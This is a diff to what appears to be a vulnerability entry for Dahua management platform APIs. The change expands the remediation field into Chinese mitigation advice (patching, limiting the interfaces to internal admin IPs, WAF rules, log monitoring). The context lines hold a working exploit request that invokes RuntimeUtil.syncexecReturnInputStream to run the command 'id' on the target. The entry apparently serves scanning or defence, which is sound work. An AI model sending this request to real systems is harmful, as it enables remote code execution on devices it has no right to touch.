@@ -10,7 +10,7 @@ detail = """POST /evo-runs/v1.0/receive HTTP/1.1 Host: target X-Subject-Headerfl
 POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1 Host: target Content-Type: application/json
 
 {"data":{"clazzName":"com.dahua.admin.util.RuntimeUtil","methodName":"syncexecReturnInputStream","fieldName":["id"]}}"""
-fix = "联系厂商获取补丁"
+fix = "联系大华厂商获取 TVD-2026-XXXXX 安全补丁；临时缓解：限制 /evo-runs/v1.0/ 和 /evo-apigw/admin/ 接口仅允许内网管理 IP 访问；WAF 拦截远程代码执行特征；监控异常的 API 调用日志。"
 date = 20250601
 label = "nday"
 cve = "TVD-2026-XXXXX"
